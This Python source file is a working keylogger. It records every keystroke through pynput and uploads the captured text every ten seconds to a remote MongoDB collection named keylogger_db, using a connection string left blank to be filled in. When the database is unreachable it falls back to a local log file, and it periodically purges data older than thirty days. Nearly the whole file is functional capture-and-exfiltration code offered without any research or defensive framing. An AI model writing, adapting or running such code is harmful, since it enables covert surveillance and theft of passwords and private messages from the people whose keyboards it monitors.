from pymongo.server_api import ServerApi
from pynput import keyboard
from pymongo import MongoClient
from datetime import datetime, timedelta
import threading
import os
import time

text = ""
time_interval = 10

# MongoDB configuration - using environment variable for security
uri = "" #put string connection here ""

# Global variables for MongoDB connection
client = None
db_connected = False


def get_db_connection():
    """Get a MongoDB connection with reconnection handling"""
    global client, db_connected
    try:
        client = MongoClient(uri, server_api=ServerApi('1')) # put api here
        client.admin.command('ping')

        # Create/access database and collection
        db = client.keylogger_db
        collection = db.keystrokes

        # Create index on timestamp for faster queries
        collection.create_index("timestamp")
        print("Successfully connected to MongoDB and created indexes")
        db_connected = True
        return collection
    except Exception as e:
        print(f"Failed to connect to MongoDB: {e}")
        db_connected = False
        return None


def cleanup_old_data(collection):
    """Delete documents older than 30 days"""
    try:
        if collection is not None:
            old_date = datetime.now() - timedelta(days=30)
            result = collection.delete_many({"timestamp": {"$lt": old_date}})
            print(f"Cleaned up {result.deleted_count} old documents")
    except Exception as e:
        print(f"Error during cleanup: {e}")


def insert_keystrokes():
    global text, db_connected
    if text:  # Only insert if there's data
        collection = None
        try:
            # Check if we have a valid connection
            if not db_connected:
                collection = get_db_connection()
                if collection is None:
                    # If connection fails, save to backup file
                    raise Exception("No MongoDB connection")
            else:
                # Reuse existing connection
                collection = client.keylogger_db.keystrokes

            # Create document to insert
            document = {
                "keystrokes": text,
                "timestamp": datetime.now(),
                "character_count": len(text),
                "session_id": os.getpid()  # Unique ID for this session
            }

            # Insert the document
            result = collection.insert_one(document)
            print(f"[{datetime.now()}] Inserted {len(text)} characters into MongoDB (ID: {result.inserted_id})")
        except Exception as e:
            print(f"MongoDB error: {e}")
            # Save to file as backup when DB fails
            with open("keylog_backup.txt", "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now()}] {text}\n")

    # Reset text and set next timer
    text = ""
    timer = threading.Timer(time_interval, insert_keystrokes)
    timer.daemon = True
    timer.start()


def on_press(key):
    global text

    try:
        if key == keyboard.Key.enter:
            text += "[ENTER]\n"
        elif key == keyboard.Key.tab:
            text += "[TAB]"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.shift:
            text += "[SHIFT]"
        elif key == keyboard.Key.backspace and len(text) == 0:
            pass
        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            text += "[CTRL]"
        elif key == keyboard.Key.esc:
            return False
        elif hasattr(key, 'char'):  # Character keys
            text += key.char
        else:  # Other special keys
            text += f"[{key.name}]"
    except Exception as e:
        print(f"Error handling key: {e}")


def periodic_cleanup():
    """Run cleanup every 24 hours"""
    while True:
        time.sleep(24 * 60 * 60)  # Sleep for 24 hours
        if db_connected:
            cleanup_old_data(client.keylogger_db.keystrokes)


if __name__ == "__main__":
    # Initialize MongoDB connection
    collection = get_db_connection()

    # Perform initial cleanup of old data if connected
    if db_connected:
        cleanup_old_data(collection)

    # Start periodic cleanup in a separate thread
    cleanup_thread = threading.Thread(target=periodic_cleanup)
    cleanup_thread.daemon = True
    cleanup_thread.start()

    print(f"{datetime.now()} - Starting MongoDB keylogger")
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            insert_keystrokes()
            listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger stopped by user")
    finally:
        # Clean up connection when exiting
        if client:
            client.close()